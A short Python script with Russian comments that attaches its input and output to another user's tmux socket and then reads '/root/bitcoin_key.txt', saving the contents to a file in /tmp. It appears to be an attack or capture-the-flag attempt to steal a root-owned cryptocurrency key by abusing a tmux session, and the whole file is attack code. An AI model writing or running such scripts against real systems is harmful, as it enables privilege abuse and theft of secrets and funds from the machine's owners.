import socket
import os
import subprocess
import sys

# Создание UNIX-сокета
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)

try:
    # Подключение к tmux-сокету
    s.connect("/tmp/tmux-100/default")

    # Перенаправление ввода-вывода
    os.dup2(s.fileno(), 0)  # stdin
    os.dup2(s.fileno(), 1)  # stdout
    os.dup2(s.fileno(), 2)  # stderr

    # Выполнение команды и захват вывода
    result = subprocess.run(
        ["cat", "/root/bitcoin_key.txt"],
        capture_output=True,
        text=True
    )

    # Сохранение вывода в файл
    with open("/tmp/bitcoin_key_output.txt", "w") as f:
        f.write("Command output:\n")
        f.write(result.stdout)
        if result.stderr:
            f.write("Errors:\n")
            f.write(result.stderr)

except Exception as e:
    with open("/tmp/bitcoin_key_output.txt", "w") as f:
        f.write(f"Error: {e}\n")
    sys.exit(1)

finally:
    s.close()